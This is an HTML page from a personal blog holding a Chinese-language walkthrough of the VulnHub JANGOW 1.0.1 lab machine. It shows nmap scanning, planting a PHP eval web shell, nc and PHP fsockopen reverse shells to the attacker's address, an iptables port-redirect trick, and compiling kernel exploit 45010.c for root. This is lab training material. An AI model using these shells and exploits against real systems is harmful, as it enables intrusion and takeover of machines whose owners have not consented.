@@ -1,0 +1,277 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>VulnHub靶场之JANGOW: 1.0.1 | Microthink-yjn140</title>
+
+<link rel="shortcut icon" href="https://yjn140.site/favicon.ico?v=1690542654805">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://yjn140.site/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+        <script src="https://cdn.jsdelivr.net/npm/mermaid@9.1.1/dist/mermaid.min.js"></script>
+        <script>mermaid.initialize({startOnLoad:true});</script> 
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Microthink-yjn140
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1690542654805"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    VulnHub靶场之JANGOW: 1.0.1
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-07-02 ·
+                    </time>
+                    
+                        <a href="https://yjn140.site/AVMJKGPZI/" class="post-tags">
+                            # vulnhub
+                        </a>
+                    
+                        <a href="https://yjn140.site/8Eo75T6ej/" class="post-tags">
+                            # CTF题
+                        </a>
+                    
+                        <a href="https://yjn140.site/BFKweRoOM/" class="post-tags">
+                            # 技术
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <p>首先是下载镜像，然后用vmware打开，记得关闭usb，然后网络配置建议设置成桥接模式，然后需要指定桥接的网卡。</p>
+<p>这样对于这个镜像还不够，需要改网卡配置。详情看另外一个视频</p>
+<p>使用nmap进行扫描</p>
+<pre><code class="language-bash">sudo nmap -sP 192.168.[num1].1/24  
+</code></pre>
+<p>/24表示那个网段1-254都扫描</p>
+<p>然后对靶机的ip进行端口扫描</p>
+<pre><code class="language-bash">sudo nmap -sC -sV -p- 192.168.[num1].[num2]
+</code></pre>
+<p>-sC 表示使用nmap脚本探测 -sV探测服务信息</p>
+<p>-p-表示扫描全端口</p>
+<p>扫出来开放了21和80端口</p>
+<p>访问80端口可以看到一个网页</p>
+<p>可以看到有一个任意命令执行漏洞</p>
+<pre><code class="language-bash">echo '&lt;?php eval($_POST[&quot;hacker&quot;]);' &gt; hacker.php
+</code></pre>
+<p>蚁剑连接一下</p>
+<p>检查文件目录</p>
+<p>/var/www/html/site/wordpress</p>
+<p>除此之外发现在/var/www/html下有一个./backup文件</p>
+<p>然后21端口，用浏览器访问一遍，然后再连接一遍</p>
+<p>发现能访问的目录是一样的，也就没啥用</p>
+<p>现在就要反弹shell</p>
+<p>这个靶机是对端口有限制的，只能用443端口。怎么判断出来的呢，两个办法。一个是因为他有网站相关服务，80端口443端口对应http和https，所以一般不会做限制。第二个办法就是利用脚本，每个端口都试一遍。而攻击机只需要把所有端口的流量都转到一个端口</p>
+<pre><code class="language-bash">sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 1234
+nc -lvvp 1234
+</code></pre>
+<p>通过测试，发现只有443端口能用，则执行</p>
+<pre><code class="language-php">&lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.[num] 443 &gt;/tmp/f');?&gt;
+</code></pre>
+<p>kali</p>
+<pre><code class="language-bash">nc -lvvp 443
+</code></pre>
+<p>Mac 得使用下面这个</p>
+<pre><code class="language-bash">nc -l 443
+</code></pre>
+<p>用这个升级一下bash功能</p>
+<pre><code class="language-bash">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<p>看一下系统版本</p>
+<pre><code class="language-bash">uname -a
+cat /proc/version
+</code></pre>
+<pre><code class="language-bash">searchsploit linux kernel 4.4
+
+searchsploit ubuntu16.04
+</code></pre>
+<p>找到这个45010.c文件，传到靶机，然后</p>
+<pre><code class="language-bash">gcc 45010.c
+
+chmod +x a.out
+
+./a.out
+
+whomi
+
+cat /root/proof.txt
+</code></pre>
+<p>443</p>
+<p>ss</p>
+<p>netstat -aptn</p>
+<p>php -r '$sock=fsockopen(&quot;192.168.2.199&quot;,3306);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://yjn140.site/gI4SR2RRz/" class="post-title gt-a-link">
+                    VulnHub靶场之THE PLANETS: EARTH
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'INIV7p9Souw8TCNgorzEFDKL-gzGzoHsz',
+		appKey: 'O4UlwuExAsqaVTYDleea1fx6',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: true,
+		placeholder: 'Just Go Go',
+		visitor: false,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">博主本人是来自一所普通学校的大学生。平时喜欢各种科技数码类的新鲜事物，只要有能力，都想学习钻研一下。各大论坛的ID为“遇见你140”或“yjn140”</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/yjn140" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        联系我：<a href="https://qm.qq.com/cgi-bin/qm/qr?k=aqjmaKpHkvEoOentnmEK2E1AfkB4-i85&noverify=0
+">QQ</a> <br><br>
+<a href="https://beian.miit.gov.cn/#/Integrated/index"   target="_blank">赣ICP备2021010019号-1</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://yjn140.site/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
